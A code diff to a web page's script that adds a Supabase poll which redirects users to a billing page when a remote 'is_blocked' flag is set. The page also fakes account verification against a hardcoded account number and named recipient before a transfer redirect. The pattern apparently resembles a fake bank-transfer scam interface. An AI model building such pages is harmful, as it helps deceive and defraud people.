@@ -120,10 +120,31 @@
   </main>
 
   <script>
-    // Initialize Supabase Client
+    // 1. Initialize Supabase Client
     const SUPABASE_URL = 'https://rgtbqipsdebekzznswll.supabase.co';
     const SUPABASE_ANON_KEY = 'sb_publishable_QF5lXikZj0cRv1sipEFtyg_zqjw0eW1';
     const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    // 2. Check if the block flag is active in user_status table
+    async function checkIsBlockedStatus() {
+      try {
+        const { data, error } = await supabase
+          .from('user_status')
+          .select('is_blocked')
+          .limit(1)
+          .single();
+
+        if (data && data.is_blocked === true) {
+          window.location.href = 'billing.html';
+        }
+      } catch (err) {
+        console.error('Check status error:', err);
+      }
+    }
+
+    // Check immediately on load and poll every 3 seconds
+    checkIsBlockedStatus();
+    setInterval(checkIsBlockedStatus, 3000);
 
     const VALID_ACCOUNT = "002114717298";
     const RECIPIENT_NAME = "Jenalyn Loreno Brondial";
@@ -147,8 +168,6 @@
       statusMsg.innerHTML = '<span class="spinner" style="display:inline-block"></span> Checking account details...';
 
       timer = setTimeout(() => {
-        // TODO: Replace this hardcoded logic with your custom supabase query later
-        // e.g., await supabase.from('YOUR_TABLE').select('*')...
         if (accountInput === VALID_ACCOUNT) {
           statusMsg.className = 'status-msg success';
           statusMsg.innerHTML = '✓ Account verified';
@@ -174,8 +193,6 @@
       btn.disabled = true;
       btnSpinner.style.display = 'inline-block';
       btnText.textContent = 'Processing...';
-
-      // TODO: Add any Supabase insertion/updates here later before redirecting
 
       setTimeout(() => {
         window.location.href = 'transfer.html';
